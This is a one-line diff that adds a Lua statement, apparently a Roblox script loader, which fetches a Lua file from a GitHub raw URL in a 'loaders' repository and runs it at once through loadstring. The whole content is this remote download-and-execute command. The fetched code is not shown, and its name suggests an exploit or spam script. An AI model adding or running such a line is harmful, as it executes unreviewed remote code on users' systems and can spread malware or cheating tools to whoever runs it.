@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/zee-zhd-spam7-jmy6bwkco25cbq.lua"))()
